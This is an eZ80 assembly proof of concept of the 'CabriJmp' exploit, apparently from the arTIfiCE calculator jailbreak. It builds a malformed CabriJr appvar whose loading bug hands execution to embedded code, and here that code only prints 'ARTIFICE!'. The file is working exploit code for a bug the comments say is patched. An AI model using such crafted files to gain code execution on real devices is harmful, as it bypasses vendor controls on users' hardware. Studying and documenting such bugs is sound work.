;========================================================
; CabriJmp exploit (as used in arTIfiCE v1 for CabriJr)
; (TI has since fixed the bug, in version 5.8.3)
;
; This code only displays "ARTIFICE!" on screen as an
; example of successful code execution, since the source
; code of the actual shell isn't the point here.
;========================================================

    .assume adl = 1

.org 0

; The CaJu appvar consists of an 11-byte header and a variable number of 21-byte objects
;
; Header part 1:
;  [0-3]:  magic bytes = CaJu (43 61 4A 75)
;  [4]:    type: 'f' (file) / 'l' (language)
; Header part 2 (assuming 'f' type here):
;  [5]:    compression ($04 = uncompressed)
;  [6]:    version byte maybe - for app possibly
;  [7-8]:  cursor X
;  [9]:	   cursor Y
;  [10]:   block count. Empty projects have 5 blocks (likely for cursor, highlight etc),
;          so count is drawn blocks + 5
;
;  Note: changing 'compression' causes the app to use alternate code to load appvar data.
;  There is a bug during loading that ends up jumping to an address within the appvar :-)
;
; Block:
;  [0]:    type (01:point, 02:segment, 04:line, 08:polygon, 10:circle, 20:string, 40:coords)
;  [1]:    maybe subtype?
;  [2-4]:  object refs - single bytes corresponding to the index of another object, or $FF
;  [5]:    bitmask? set to $0F for new objects, changed to $8D when object is hidden
;  [6]:    ?
;  [7-10]: coords?
;  [11-19]:object data (depends on type)
;  [20]:   ?
;
; Footer:
;  [0]:    ?
;  [1:]:   filename
;  [-1]:   null terminator


; header
    .db   "CaJu"
    .db   "f"
    .db   004h
    .db   005h
    .db   0AAh,0AAh
    .db   0AAh
    .db   005h
; data - you can follow with a debugger...
    .db   040h,0E2h,0FFh,0FFh,0AAh,0AAh,0AAh,018h
    .db   012h,01Ah,0AAh,0AAh,055h,000h,055h,004h
    .db   055h,055h,055h,0AAh,0AAh,080h,0AAh,000h
    .db   038h,0AAh,080h

; ... when it gets here to this printing example
    call  0020808h        ; _ClrLCDFull
    call  0021A3Ch        ; _DrawStatusBar
    ld    hl,009h<<8
    ld    (0D00595h),hl   ; curRow
    lea   hl,ix+str+01Fh
    call  00207C0h        ; _PutS
    call  0020D8Ch        ; _GetKey
    call  0021798h        ; _SetupHome
    jp    0021FA8h        ; _os_ForceCmdNoChar
str:
    .db   "ARTIFICE!",0
